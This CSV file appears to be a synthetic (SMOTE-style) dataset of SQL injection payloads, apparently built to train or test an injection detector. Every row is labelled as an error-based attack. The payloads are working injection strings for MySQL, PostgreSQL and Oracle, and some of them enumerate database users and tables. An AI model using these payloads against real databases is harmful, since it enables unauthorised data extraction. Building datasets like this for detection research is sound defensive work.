id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000400,attack,error,"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sloy'  =  'sloy",nearest_attack_euclidean,R000075,0.13349247650430837
SMOTE_000401,attack,error,"1   )    )    as qzmg where 4344  =  4344 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000150,3.990668700007712
SMOTE_000402,attack,error,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000072,0.9065187698880761
SMOTE_000403,attack,error,-5967 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # lhoh,nearest_attack_euclidean,R000031,0.7943494211233112
SMOTE_000404,attack,error,"1'||  (  select 'vsfg' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",nearest_attack_euclidean,R000048,0.4128923182353177
SMOTE_000405,attack,error,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",nearest_attack_euclidean,R000042,0.9935714912223899
SMOTE_000406,attack,error,"1'  )   where 9544  =  9544 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000044,1.144559513554747
SMOTE_000407,attack,error,"1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474",nearest_attack_euclidean,R000101,0.3998934366890362
SMOTE_000408,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000099,0.6457996118966354
SMOTE_000409,attack,error,"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- gkcl",nearest_attack_euclidean,R000030,0.20544773125565105
SMOTE_000410,attack,error,"1'  )   where 6056  =  6056 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000057,0.23595248000391558
SMOTE_000411,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.08886684514402675
SMOTE_000412,attack,error,"1'   )    )    as sxpk where 5524  =  5524 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000088,0.03124309598748515
SMOTE_000413,attack,error,"1'   )    )    as sxpk where 5524  =  5524 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000088,0.6572844281806532
SMOTE_000414,attack,error,"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'ibrj'  =  'ibrj",nearest_attack_euclidean,R000142,0.0700045813163056
SMOTE_000415,attack,error,-9143  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,nearest_attack_euclidean,R000047,0.8587643395471937
SMOTE_000416,attack,error,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""gxhz""  =  ""gxhz",nearest_attack_euclidean,R000118,0.09282563673677276
SMOTE_000417,attack,error,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""gxhz""  =  ""gxhz",nearest_attack_euclidean,R000118,1.4735819565441344
SMOTE_000418,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.23470943077703466
SMOTE_000419,attack,error,"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wfws'  =  'wfws",nearest_attack_euclidean,R000046,0.1597109942341434
SMOTE_000420,attack,error,"-2852%'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000151,0.9688657626767658
SMOTE_000421,attack,error,"1""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""hbgr"" like ""hbgr",nearest_attack_euclidean,R000096,0.5630563090944699
SMOTE_000422,attack,error,-4615' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000028,0.11797585322623148
SMOTE_000423,attack,error,"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wfws'  =  'wfws",nearest_attack_euclidean,R000046,0.5103868421347936
SMOTE_000424,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000035,0.2828360531635981
SMOTE_000425,attack,error,1%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',nearest_attack_euclidean,R000113,1.4554398787971794
SMOTE_000426,attack,error,1%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',nearest_attack_euclidean,R000113,0.38242404639397026
SMOTE_000427,attack,error,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'jwbt'  =  'jwbt",nearest_attack_euclidean,R000127,1.5181231273124698
SMOTE_000428,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000021,0.789505588380143
SMOTE_000429,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000041,0.3033244290364189
SMOTE_000430,attack,error,"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""imlx""  =  ""imlx",nearest_attack_euclidean,R000033,0.3503601730968181
SMOTE_000431,attack,error,"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'ibrj'  =  'ibrj",nearest_attack_euclidean,R000142,0.9066495156376183
SMOTE_000432,attack,error,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000117,1.037094729394282
SMOTE_000433,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'eugs'  =  'eugs",nearest_attack_euclidean,R000025,0.049726918563973425
SMOTE_000434,attack,error,"1'+  (  select 'ples' where 4244  =  4244 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000061,0.896302160529984
SMOTE_000435,attack,error,"1'+  (  select 'usoq' where 7783  =  7783 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",nearest_attack_euclidean,R000086,0.6963157126118249
SMOTE_000436,attack,error,"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""hybu"" like ""hybu",nearest_attack_euclidean,R000071,0.6804143849186618
SMOTE_000437,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000114,0.36947792389304274
SMOTE_000438,attack,error,"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000132,0.02259878348156677
SMOTE_000439,attack,error,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",nearest_attack_euclidean,R000091,0.32919692922464183
SMOTE_000440,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu",nearest_attack_euclidean,R000016,0.008509709934169149
SMOTE_000441,attack,error,"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000148,1.6738635821965033
SMOTE_000442,attack,error,"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'yqhk'  =  'yqhk",nearest_attack_euclidean,R000063,0.21458925217697375
SMOTE_000443,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,0.40095493180201747
SMOTE_000444,attack,error,"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- gkcl",nearest_attack_euclidean,R000030,0.27250036410397493
SMOTE_000445,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000093,1.7618424219800606
SMOTE_000446,attack,error,"-3775'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000040,0.10458979762512381
SMOTE_000447,attack,error,"1""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""wfwg"" like ""wfwg",nearest_attack_euclidean,R000080,0.9148523440060342
SMOTE_000448,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu",nearest_attack_euclidean,R000017,0.42704795351979075
SMOTE_000449,attack,error,"1'+  (  select vvet where 5221  =  5221 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",nearest_attack_euclidean,R000149,1.6066816009076494
SMOTE_000450,attack,error,"1  )   as qjjm where 3850  =  3850 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000029,0.4357328554818376
SMOTE_000451,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,1.649277569848787
SMOTE_000452,attack,error,"1""  )   as zbhs where 2017  =  2017 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000087,1.4701654626014669
SMOTE_000453,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.2579976053363478
SMOTE_000454,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'eugs'  =  'eugs",nearest_attack_euclidean,R000025,0.1162570851252475
SMOTE_000455,attack,error,"1' in boolean mode  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  #",nearest_attack_euclidean,R000134,0.40082249011537924
SMOTE_000456,attack,error,"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'vcph'  =  'vcph",nearest_attack_euclidean,R000038,0.874799170653126
SMOTE_000457,attack,error,"-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000032,0.4357802784801547
SMOTE_000458,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000135,1.1212394960229923
SMOTE_000459,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000049,1.080015435141687
SMOTE_000460,attack,error,"1""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""ngnd"" like ""ngnd",nearest_attack_euclidean,R000092,0.30925007829046086
SMOTE_000461,attack,error,"1""  )   as ltoa where 9159  =  9159 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000116,0.6401007582482369
SMOTE_000462,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.0
SMOTE_000463,attack,error,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",nearest_attack_euclidean,R000091,0.08175192659386231
SMOTE_000464,attack,error,"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000051,1.9331641010020701
SMOTE_000465,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu",nearest_attack_euclidean,R000016,2.1490164914253547
SMOTE_000466,attack,error,"1'+  (  select 'bmit' where 3716  =  3716 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   +'",nearest_attack_euclidean,R000037,1.1060493007609304
SMOTE_000467,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",nearest_attack_euclidean,R000133,0.9374453814358397
SMOTE_000468,attack,error,"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R000083,1.0521350927489073
SMOTE_000469,attack,error,"1""  )   as yggn where 1006  =  1006 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000098,0.06701008307681446
SMOTE_000470,attack,error,"1""  )   where 1392  =  1392 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000107,0.31718830110588975
SMOTE_000471,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000050,0.8295044657073419
SMOTE_000472,attack,error,"1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000144,2.015375295071423
SMOTE_000473,attack,error,"1'||  (  select 'vsfg' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",nearest_attack_euclidean,R000048,0.35109280190999564
SMOTE_000474,attack,error,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",nearest_attack_euclidean,R000042,0.8319586715267528
SMOTE_000475,attack,error,"1""  )   as yggn where 1006  =  1006 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000098,0.8193413369955552
SMOTE_000476,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,0.6000317786180799
SMOTE_000477,attack,error,"1 where 2278  =  2278 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000138,0.8520614183377971
SMOTE_000478,attack,error,"  (  select 2768 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  2768  =  2768,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000062,0.9465472429189975
